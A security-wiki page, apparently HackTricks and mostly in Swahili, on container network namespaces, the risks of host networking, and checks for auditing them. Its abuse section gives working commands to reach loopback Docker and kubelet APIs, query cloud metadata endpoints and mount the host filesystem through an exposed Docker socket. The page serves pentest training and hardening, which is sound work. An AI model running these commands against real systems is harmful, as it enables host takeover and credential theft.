# Namespace ya Mtandao

{{#include ../../../../../banners/hacktricks-training.md}}

## Muhtasari

Namespace ya mtandao huwagawa rasilimali zinazohusiana na mtandao kama interfaces, IP addresses, routing tables, ARP/neighbor state, firewall rules, sockets, na yaliyomo kwenye faili kama `/proc/net`. Hii ndicho kilichofanya container kuonekana kuwa na `eth0` yake mwenyewe, ruta zake za ndani, na kifaa chake cha loopback bila kumiliki host's real network stack.

Kwa upande wa usalama, hili ni muhimu kwa sababu network isolation ni zaidi ya port binding. Private network namespace inaleta mipaka ya kile workload inaweza kuona au kureconfigure moja kwa moja. Mara namespace hiyo inaposhirikiwa na host, container inaweza kwa ghafla kupata uwezo wa kuona host listeners, host-local services, na network control points ambazo hazikusudiwa kufichuliwa kwa application.

## Uendeshaji

Namespace ya mtandao iliyotengenezwa hivi karibuni huanza na mazingira ya mtandao tupu au karibu tupu hadi interfaces ziambatwe. Container runtimes kisha huunda au kuunganisha virtual interfaces, kutoa addresses, na kusanidi routes ili workload iwe na connectivity inayotarajiwa. Katika bridge-based deployments, hii kawaida ina maana container inaona veth-backed interface iliyounganishwa na host bridge. Katika Kubernetes, CNI plugins zinashughulikia usanidi sawa kwa ajili ya Pod networking.

Muundo huu unaelezea kwa nini `--network=host` au `hostNetwork: true` ni mabadiliko makubwa. Badala ya kupokea prepared private network stack, workload inaunga mkono na network halisi ya host.

## Maabara

Unaweza kuona namespace ya mtandao karibu tupu kwa:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Na unaweza kulinganisha containers za kawaida na host-networked kwa:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
The host-networked container no longer has its own isolated socket and interface view. That change alone is already significant before you even ask what capabilities the process has.

## Matumizi ya runtime

Docker na Podman kwa kawaida huunda private network namespace kwa kila container isipokuwa vimewekwa vingine. Kubernetes kawaida hutoa kila Pod network namespace yake, inayoshirikiwa na containers ndani ya Pod hiyo lakini tofauti na host. Incus/LXC systems pia hutoa izoleshini tajiri iliyotegemea network namespace, mara nyingi na aina mbalimbali za virtual networking setups.

Kanuni kuu ni kwamba private networking ni mpaka wa izoleshini kwa chaguo-msingi, wakati host networking ni uteuzi wazi unaokiuka mpaka huo.

## Mipangilio isiyofaa

Marekebisho muhimu zaidi ni kushiriki tu host network namespace. Hii wakati mwingine hufanywa kwa utendaji, ufuatiliaji wa kiwango cha chini, au urahisi, lakini inatoa kuondoa mmoja wa mipaka safi zaidi inayopatikana kwa containers. Host-local listeners vinakuwa vinavyoweza kufikiwa kwa njia ya moja kwa moja, localhost-only services zinaweza kufikiwa, na capabilities such as `CAP_NET_ADMIN` or `CAP_NET_RAW` zinakuwa hatari zaidi kwa sababu operesheni wanazowezesha sasa zinaathiri mazingira ya mtandao ya host.

Tatizo jingine ni kutoa capabilities zinazohusiana na mtandao kupita kiasi hata wakati network namespace ni private. Namespace binafsi husaidia, lakini haitufanyi raw sockets au udhibiti wa mtandao wa hali ya juu kuwa salama.

In Kubernetes, `hostNetwork: true` pia hubadilisha kiwango cha imani unachoweza kuweka katika segmentation ya mtandao ya ngazi ya Pod. Kubernetes inaeleza kuwa plugins nyingi za mtandao haziwezi kutofautisha vizuri trafiki ya Pod za `hostNetwork` kwa ajili ya podSelector / namespaceSelector matching na kwa hivyo huwa zinazitendea kama trafiki ya node ya kawaida. Kutoka kwa mtazamo wa mshambuliaji, hiyo inamaanisha workload iliyokoromishwa ya `hostNetwork` mara nyingi inapaswa kutendewa kama foothold ya mtandao ya ngazi ya node badala ya Pod ya kawaida bado iliyokabiliwa na dhana za sera sawa kama overlay-network workloads.

## Matumizi mabaya

Katika mipangilio yenye izoleshini dhaifu, mshambuliaji anaweza kuchunguza huduma zinazolisikiliza kwenye host, kufikia management endpoints zilizo bind tu kwa loopback, sniff au kuingilia trafik kulingana na capabilities kamili na mazingira, au kusanidi upya routing na hali ya firewall ikiwa `CAP_NET_ADMIN` ipo. Katika cluster, hii pia inaweza kurahisisha lateral movement na control-plane reconnaissance.

Ikiwa unashuku host networking, anza kwa kuthibitisha kwamba interfaces na listeners zinazoonekana zinamilikiwa na host badala ya mtandao uliotengwa wa container:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Huduma zinazotumia loopback pekee mara nyingi huwa ugunduzi wa kwanza wa kuvutia:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Ikiwa uwezo wa mtandao upo, jaribu ikiwa workload inaweza kuchunguza au kubadilisha stack inayoonekana:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Katika kernels za kisasa, host networking pamoja na `CAP_NET_ADMIN` pia yanaweza kufichua packet path zaidi ya mabadiliko ya kawaida ya `iptables` / `nftables`. `tc` qdiscs na filters pia ni namespace-scoped, hivyo katika shared host network namespace zinatumika kwa host interfaces ambazo container inaweza kuona. Ikiwa `CAP_BPF` pia ipo, network-related eBPF programs kama TC na XDP loaders zinakuwa muhimu pia:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Hii ni muhimu kwa sababu mshambuliaji anaweza mirror, redirect, shape, au drop traffic kwa ngazi ya host interface, si tu kuandika upya firewall rules. Katika private network namespace vitendo hivyo vinabaki kwa mtazamo wa container; katika shared host namespace vinakuwa host-impacting.

Katika cluster au cloud environments, host networking pia inafaa kwa quick local recon ya metadata na control-plane-adjacent services:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Mfano Kamili: Host Networking + Local Runtime / Kubelet Access

Host networking haitoi host root moja kwa moja, lakini mara nyingi huweka wazi huduma ambazo kwa makusudi zinapatikana tu kutoka kwenye node yenyewe. Ikiwa moja ya huduma hizo haijalindwa vizuri, host networking inakuwa njia ya moja kwa moja ya privilege-escalation.

Docker API kwenye localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet kwenye localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Athari:

- kuingiliwa kwa moja kwa moja kwa mwenyeji ikiwa API ya runtime ya ndani imefunuliwa bila ulinzi unaofaa
- utambuzi wa cluster au lateral movement ikiwa kubelet au agents wa ndani yanapatikana
- kubadilisha trafiki au denial of service wakati vinapoambatana na `CAP_NET_ADMIN`

## Ukaguzi

Lengo la ukaguzi huu ni kujua kama mchakato una safu ya mtandao ya kibinafsi, ni njia na wasikilizaji gani yanayoonekana, na kama mtazamo wa mtandao tayari unaonekana kama ule wa mwenyeji kabla hata hujaribu capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Kinachovutia hapa:

- Ikiwa `/proc/self/ns/net` na `/proc/1/ns/net` tayari zinaonekana kama za host, container inaweza kuwa inashiriki host network namespace au namespace nyingine isiyokuwa ya kibinafsi.
- `lsns -t net` na `ip netns identify` ni muhimu wakati shell tayari iko ndani ya namespace iliyopangiwa jina au inayoendelea na unapotaka kuihusu na vitu vya `/run/netns` kutoka upande wa host.
- `ss -lntup` ni muhimu hasa kwa sababu inaonyesha wasikilizaji wa loopback pekee na local management endpoints.
- Njia (routes), majina ya interface, muktadha wa firewall, hali ya `tc`, na viambatisho vya `eBPF` vinakuwa muhimu zaidi ikiwa `CAP_NET_ADMIN`, `CAP_NET_RAW`, au `CAP_BPF` ipo.
- Katika `Kubernetes`, kutotimia kwa utatuzi wa jina la service kutoka Pod yenye `hostNetwork` kunaweza kumaanisha tu Pod haikutumia `dnsPolicy: ClusterFirstWithHostNet`, si kwamba service haipo.

Unapokagua container, daima tathmini network namespace pamoja na seti ya capabilities. Host networking pamoja na uwezo mkubwa wa mtandao ni mtazamo tofauti kabisa kuliko bridge networking pamoja na seti ndogo ya capabilities za default.

## References

- [Kubernetes NetworkPolicy na onyo kuhusu `hostNetwork`](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token na mahitaji ya capability kwa programu za eBPF zinazohusiana na mtandao](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
